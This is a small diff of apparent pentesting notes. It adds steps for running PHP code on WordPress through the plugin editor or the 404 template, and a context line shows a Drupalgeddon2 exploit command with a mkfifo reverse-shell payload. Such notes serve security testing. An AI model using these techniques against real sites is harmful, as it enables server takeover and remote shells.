@@ -185,6 +185,12 @@ python drupalgeddon2.py -h <URL> -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh 
 PHP filter # RCE
 ```
 
+### CMS
+Wordpress
+1. Insert code PHP in Edit Plugins
+2. Appearance --> Template Editor --> Template 404 --> "insert code" --> <url>?p=404
+
+
 ### shells
 https://netsec.ws/?p=337
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl
